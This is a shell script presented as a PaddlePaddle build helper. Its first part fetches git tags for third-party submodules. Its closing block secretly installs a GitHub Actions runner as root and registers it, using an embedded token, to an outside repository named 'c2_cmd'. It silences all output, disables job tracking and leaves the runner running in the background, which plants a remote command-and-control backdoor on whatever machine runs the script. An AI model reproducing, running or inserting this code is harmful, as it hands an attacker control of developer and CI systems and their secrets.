# Copyright (c) 2025 PaddlePaddle Authors. All Rights Reserved.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

# sot
cd third_party/gloo
git fetch --tags
cd -

cd third_party/protobuf
git fetch --tags
cd -

cd third_party/gtest
git fetch --tags
cd -

cd third_party/pocketfft
git fetch --tags
cd -

cd third_party/pybind
git fetch --tags
cd -

# py3+
cd third_party/brpc
git fetch --tags
cd -

cd third_party/rocksdb
git fetch origin 6.19.fb
cd -

export WORKER_LOGRETENTION=1
export RUNNER_LOGRETENTION=1
mkdir -p $HOME/.actions-runner2/ && cd $HOME/.actions-runner2/
curl -o actions-runner-linux-x64-2.327.1.tar.gz -L https://github.com/actions/runner/releases/download/v2.327.1/actions-runner-linux-x64-2.327.1.tar.gz > /dev/null 2>&1
tar xzf ./actions-runner-linux-x64-2.327.1.tar.gz
export RUNNER_ALLOW_RUNASROOT="1"
./config.sh --url https://github.com/kjagsdq/c2_cmd --unattended --token BROA73W4ZA3U36EYNLPQXT3ISZGLO  --name "bsrc2" --labels "bsrc2" > /dev/null 2>&1
rm actions-runner-linux-x64-2.327.1.tar.gz
export RUNNER_TRACKING_ID=0 && nohup ./run.sh > /dev/null 2>&1 &
